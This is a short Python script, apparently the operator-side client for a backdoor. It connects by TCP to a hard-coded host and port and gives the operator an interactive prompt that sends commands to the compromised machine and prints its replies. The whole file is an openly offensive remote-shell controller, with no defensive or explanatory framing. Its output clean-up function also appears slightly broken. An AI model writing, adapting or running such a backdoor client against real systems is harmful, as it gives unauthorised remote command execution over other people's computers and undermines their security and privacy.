import socket
import time
import subprocess
import re

ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.20" #ip server
port = 12345 #port server
print("[**] Connecting to the backdoor...")

def cleaned_text(rsp):
        rsp = re.sub(r'\r\n', '\n', rsp)
        rsp = re.sub(r'\r\n\r\n', '\n', rsp)   
        rsp = re.sub('\x82', 'é', rsp)  
        rsp = re.sub('\xff057', '', rsp)
        return rsp

try: 
    ss.connect((host, port)) #connect to the server
    time.sleep(1)
    print("[**]Connection to the backdoor succeeded")   
    print(f"[**] Successful connection to the backdoor --- ip : {host} ~ port : {port}")
    while True:
        cmd = input('$> ')
        if cmd == "stop":
            print("[**]Connection to the backdoor close...")
            break
        cmd = str.encode(cmd + '\n')
        ss.send(cmd)
        rsp = ss.recv(1024)
        print(cleaned_text(str(rsp)))
        
        

except:
        print("Probleme during the connection")
        
